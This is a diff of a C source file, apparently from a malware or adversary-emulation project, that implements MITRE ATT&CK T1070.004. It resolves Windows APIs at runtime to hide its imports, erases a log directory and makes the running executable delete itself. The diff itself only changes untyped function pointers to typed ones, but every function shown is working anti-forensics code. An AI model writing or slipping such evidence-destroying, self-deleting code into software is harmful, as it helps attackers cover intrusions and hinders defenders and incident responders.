@@ -1,6 +1,7 @@
 #include "T1070.004.h"
 
 #include "../misc/common.h"
+#include "../misc/function_pointers.h"
 #include "../misc/wstr.h"
 #include "../runtime_linking.h"
 
@@ -36,16 +37,16 @@ static WideString log_directory()
 }
 static BOOL exists(ProcedureList* pShlwapi, WideString* pLogDir)
 {
-	FARPROC PFN_PathIsDirectoryW = *VECTOR_AT(pShlwapi->procedures, FARPROC, PATH_IS_DIRECTORY_W);
-	return PFN_PathIsDirectoryW(WSTRING_C_STR(*pLogDir));
+	PFN_PathIsDirectoryW path_is_directory_w = *VECTOR_AT(pShlwapi->procedures, PFN_PathIsDirectoryW, PATH_IS_DIRECTORY_W);
+	return path_is_directory_w(WSTRING_C_STR(*pLogDir));
 }
 static void erase_logs(ProcedureList* pKernel32, ProcedureList* pShlwapi)
 {
 	WideString logDirectory = log_directory();
 	if (exists(pShlwapi , &logDirectory))
 	{
-		FARPROC PFN_RemoveDirectoryW = *VECTOR_AT(pKernel32->procedures, FARPROC, REMOVE_DIRECTORY_W);
-		if (!PFN_RemoveDirectoryW(WSTRING_C_STR(logDirectory)))
+		PFN_RemoveDirectoryW remove_directory_w = *VECTOR_AT(pKernel32->procedures, PFN_RemoveDirectoryW, REMOVE_DIRECTORY_W);
+		if (!remove_directory_w(WSTRING_C_STR(logDirectory)))
 		{
 			PRINT_WIN32_ERROR(RemoveDirectoryW);
 			assert(FALSE);
@@ -56,8 +57,8 @@ static void erase_logs(ProcedureList* pKernel32, ProcedureList* pShlwapi)
 }
 static BOOL file_exists(ProcedureList* pShlwapi, const char* path)
 {
-	FARPROC PFN_PathFileExistsA = *VECTOR_AT(pShlwapi->procedures, FARPROC, PATH_FILE_EXISTS_A);
-	if (!PFN_PathFileExistsA(path))
+	PFN_PathFileExistsA path_file_exists_a = *VECTOR_AT(pShlwapi->procedures, PFN_PathFileExistsA, PATH_FILE_EXISTS_A);
+	if (!path_file_exists_a(path))
 	{
 		PRINT_WIN32_ERROR(PathFileExistsA);
 		return FALSE;
@@ -82,12 +83,12 @@ static void self_delete(ProcedureList* pKernel32, ProcedureList* pShlwapi, char*
 		return;
 	}
 
-	FARPROC PFN_DeleteFileA = *VECTOR_AT(pKernel32->procedures, FARPROC, DELETE_FILE_A);
-	if (!PFN_DeleteFileA(self))
+	PFN_DeleteFileA delete_file_a = *VECTOR_AT(pKernel32->procedures, PFN_DeleteFileA, DELETE_FILE_A);
+	if (!delete_file_a(self))
 	{
 
-		FARPROC PFN_GetLastError = *VECTOR_AT(pKernel32->procedures, FARPROC, GET_LAST_ERROR);
-		DWORD err = PFN_GetLastError();
+		PFN_GetLastError get_last_error = *VECTOR_AT(pKernel32->procedures, PFN_GetLastError, GET_LAST_ERROR);
+		DWORD err = get_last_error();
 		if (err != ERROR_ACCESS_DENIED)
 		{
 			PRINT_WIN32_ERROR(DeleteFileA);
